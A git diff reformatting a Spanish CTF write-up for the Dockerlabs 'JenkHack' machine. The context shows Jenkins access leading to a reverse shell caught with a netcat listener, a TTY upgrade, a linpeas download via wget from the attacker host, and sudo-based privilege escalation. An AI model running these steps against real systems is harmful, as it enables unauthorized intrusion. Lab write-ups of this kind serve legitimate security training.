@@ -1,22 +1,30 @@
-# 🖥️ Writeup - JenkHack 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# JenkHack ​​
+
+## 🖥️ Writeup - JenkHack
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `Jenkins` `Groovy` `RCE` `Linpeas` `Base85` `Sudoers` `Writable File`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip jenkhack.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh jenkhack.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p80,443,8080 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 15:42 CET
 Nmap scan report for 172.17.0.2
@@ -103,7 +112,7 @@ Accedemos al puerto `80` y encontramos una página web de herramientas de cibers
 
 Accedemos al puerto `8080` y nos encontramos con el panel de inicio de sesión de `Jenkins`, por lo que vamos a probar a autenticarnos con dichas credenciales.
 
-![alt text](../../images/jenkinss.png)
+![alt text](../../.gitbook/assets/jenkinss.png)
 
 Hemos obtenido acceso al panel de administración de `Jenkins`.
 
@@ -129,6 +138,7 @@ sudo nc -nlvp 4444
 Ahora sí, ejecutamos el script.
 
 Info:
+
 ```
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 51044
@@ -138,31 +148,35 @@ jenkins
 
 Hemos recibido la `reverse shell` como el usuario `jenkins`.
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
-Vamos a transferirnos el script `linpeas.sh` desde la máquina atacante a la víctima de la siguiente manera:
-Levantamos un servidor `HTTP` en el directorio donde tenemos `linpeas.sh`.
+Vamos a transferirnos el script `linpeas.sh` desde la máquina atacante a la víctima de la siguiente manera: Levantamos un servidor `HTTP` en el directorio donde tenemos `linpeas.sh`.
 
 ```bash
 python3 -m http.server 80
@@ -175,6 +189,7 @@ wget http://172.17.0.1/linpeas.sh
 ```
 
 Info:
+
 ```
 --2025-11-01 16:19:15--  http://172.17.0.1/linpeas.sh
 Connecting to 172.17.0.1:80... connected.
@@ -195,6 +210,7 @@ chmod +x linpeas.sh
 ```
 
 Info:
+
 ```
 ╔══════════╣ Searching root files in home dirs (limit 30)
 /home/
@@ -236,6 +252,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for jenkhack on a6526368dbcf:
     env_reset, mail_badpass,
@@ -253,6 +270,7 @@ sudo /usr/local/bin/bash
 ```
 
 Info:
+
 ```
 Welcome to the bash application!
 Running command...
@@ -281,6 +299,7 @@ sudo /usr/local/bin/bash
 ```
 
 Info:
+
 ```
 Welcome to the bash application!
 Running command...
